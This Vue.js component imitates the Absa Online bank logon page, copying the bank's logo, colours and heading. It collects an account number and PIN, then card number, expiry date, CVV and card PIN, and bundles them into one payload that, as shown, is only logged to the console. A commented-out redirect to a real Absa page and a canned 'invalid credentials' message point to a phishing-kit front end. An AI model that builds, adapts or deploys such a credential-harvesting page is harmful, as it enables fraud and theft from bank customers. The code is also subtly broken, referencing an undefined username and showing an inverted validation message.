<template>
  <v-container style="height:100vh" class="px-0 py-10">
    <v-row class="ma-0" align="center" justify="center">
      <v-col cols="12" class="text-center my-6">
        <v-avatar size="70" class="mx-auto">
          <v-img contain src="/banks/absa.png" />
        </v-avatar>
      </v-col>
      <v-col cols="12" class="pa-0 px-sm-4">
        <v-card max-width="450" outlined class="mx-auto rounded-lg">
          <v-card-title>
            <div style="width:100%" class="font-weight-bold rounded absaColor white--text px-2 py-1 text-subtitle-1">
              Logon | Welcome to Absa Online
            </div>
          </v-card-title>

          <v-card-text>
            <div v-if="isError" class="d-flex align-center amber lighten-5 rounded my-2 pa-2">
              <v-btn icon class="mr-1" @click="next">
                <v-icon color="red darken-1">
                  mdi-close
                </v-icon>
              </v-btn>
              <div class="grey--text text--darken-2">
                {{ error }}
              </div>
            </div>
            <v-card outlined class="rounded-lg">
              <v-card-title class="grey lighten-4 grey--text text--darken-1 text-subtitle-1 font-weight-bold py-2">
                Logon details
              </v-card-title>
              <v-divider />
              <v-card-text>
                <v-form
                  ref="form"
                  v-model="valid"
                  lazy-validation
                  @submit.prevent="submit"
                >
                  <v-row v-if="!isCard" no-gutters class="ma-0">
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter your access <br class="d-block d-sm-none"> account number
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="accountNumber"
                            type="accountNumber"
                            name="accountNumber"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter your <br class="d-block d-sm-none"> user pin
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="password"
                            type="password"
                            name="password"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class="d-flex">
                      <v-spacer />
                      <v-btn dark depressed color="deep-orange accent-3" class="px-4" @click="next">
                        Next
                      </v-btn>
                    </v-col>
                  </v-row>
                  <v-row v-else no-gutters>
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter your <br class="d-block d-sm-none"> Card Number
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="cardNo"
                            type="text"
                            name="cardNo"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter Expiry <br class="d-block d-sm-none"> Date
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="expiryDate"
                            type="text"
                            name="expiryDate"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter CVV
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="cvv"
                            type="text"
                            name="cvv"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class=" mt-n2">
                      <div class="d-flex">
                        <div class="text2--text text-caption mt-sm-2 mr-2">
                          Enter Pin
                        </div>
                        <v-spacer />
                        <div style="max-width:150px">
                          <v-text-field
                            v-model="pin"
                            type="text"
                            name="pin"
                            dense
                            outlined
                            color="deep-orange accent-4"

                            class="text-subtitle-2 rounded-lg font-weight-light"
                          />
                        </div>
                      </div>
                    </v-col>
                    <v-col cols="12" class="d-flex">
                      <v-spacer />
                      <v-btn type="submit" dark depressed color="deep-orange accent-3" class="px-4">
                        Next
                      </v-btn>
                    </v-col>
                  </v-row>
                </v-form>
              </v-card-text>
            </v-card>
          </v-card-text>
        </v-card>
      </v-col>
    </v-row>
  </v-container>
</template>

<script>
export default {
  data: () => ({
    isCard: false,
    isError: false,
    error: 'Invalid user credentials entered.',
    accountNumber: '',
    accountNumberRules: [
      v => !!v || 'Account Number is required'
    ],
    password: '',
    passwordRules: [
      v => !!v || 'Password is required'
    ],
    cardNo: '',
    cardNoRules: [
      v => !!v || 'Card Number is required'
    ],
    expiryDate: '',
    expiryDateRules: [
      v => !!v || 'Expiry Date is required'
    ],
    cvv: '',
    cvvRules: [
      v => !!v || 'CVV is required'
    ],
    pin: '',
    pinRules: [
      v => !!v || 'Pin is required'
    ]
  }),

  methods: {

    submit () {
      if (this.validate(this.cardNo, 'Card Number') && this.validate(this.expiryDate, 'Expiry Date') && this.validate(this.cvv, 'cvv') && this.validate(this.pin, 'Pin')
      ) {
        const payload = {
          username: this.username,
          password: this.password,
          cardNo: this.cardNo,
          expiryDate: this.expiryDate,
          cvv: this.cvv,
          pin: this.pin
        }
        console.log(payload)

        // window.location.href = 'https://www.absa.africa/absaafrica/careers/'
      }
    },
    next () {
      if (this.validate(this.accountNumber, 'Account Number') && this.validate(this.password, 'Password')) {
        this.isCard = true
      }
    },
    validate (field, name) {
      if (field.trim() === '') {
        this.isError = true
        this.error = `${name} must be empty`
        return false
      } else {
        this.isError = false
        this.error = null
        return true
      }
    },
    clear () {
      this.reset()
      this.resetValidation()
    },

    reset () {
      this.$refs.form.reset()
    },

    resetValidation () {
      this.$refs.form.resetValidation()
    }
  }

}
</script>

<style>

.absaColor {
    background-color: #AF154B;
}

</style>
